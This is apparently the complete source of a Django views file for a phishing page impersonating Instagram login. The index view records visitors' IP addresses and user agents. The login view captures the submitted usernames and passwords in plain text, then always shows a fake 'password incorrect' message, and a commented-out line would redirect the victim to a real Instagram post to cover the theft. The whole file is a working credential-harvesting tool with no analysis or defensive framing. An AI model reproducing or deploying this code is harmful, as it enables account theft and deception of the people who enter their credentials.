# yourappname/views.py

from django.shortcuts import render,redirect
from django.contrib import messages
import json
import os
def index(request):
    user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown User Agent')
    device_info = f'Device Info: {user_agent}'

    # Capture user's IP address
    user_ip = request.META.get('REMOTE_ADDR', 'Unknown IP')
    print(device_info)
    print(f'User IP: {user_ip}')
    return render(request, 'myapp/index.html', {'message': 'Hello, this is your app\'s index page.'})
def login_view(request):
    success_message = None
    
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        # Save form data to the database
        user_data = {'username': username, 'password': password}
        print(f'User Data: {user_data}')
        success_message = 'Sorry, your password was incorrect. Please double-check your password.'
        messages.success(request, success_message)
        # return redirect('https://www.instagram.com/p/C1-Bhj2v0T-/')

    return render(request, 'myapp/index.html', {'success_message': success_message})